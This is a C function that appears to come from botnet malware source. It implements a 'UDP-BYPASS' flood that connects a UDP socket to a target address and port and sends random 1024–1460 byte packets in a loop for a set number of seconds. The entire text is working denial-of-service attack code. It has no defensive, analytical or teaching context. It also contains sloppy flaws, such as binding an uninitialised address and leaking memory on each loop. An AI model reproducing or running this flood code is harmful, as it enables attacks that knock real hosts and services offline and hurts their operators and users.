void udppbypassattack(unsigned char *target, uint16_t port, int secs) 
{
    struct sockaddr_in bypass;
    int fds = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
 
    bind(fds, (struct sockaddr *)&bypass, sizeof(bypass));
    
    bypass.sin_family = AF_INET;
    bypass.sin_port = htons(port);
    bypass.sin_addr.s_addr = inet_addr(target);
 
    time_t start = time(NULL);
    connect(fds, (struct sockaddr *)&bypass, sizeof(bypass));
 
    DEBUG_PRINT("(UDP-BYPASS) Attack Starting\r\n");
    while(1)
    {
        uint16_t size = 0;
        int a = 0;
        char *data;
        size = 1024 + rand() % (1460 - 1024);
        data = (char *)malloc(size);
 
        for (a = 0; a < size; a++) 
        {
            data[a] = (char)(rand() & 0xFFFF);
        }
        send(fds, data, size, MSG_NOSIGNAL);
        if(time(NULL) >= start + secs) 
        {
            DEBUG_PRINT("(UDP-BYPASS) Attack Stopping\r\n");
            close(fds);
            free(data);
            exit(0);
        }
    }
    return;
}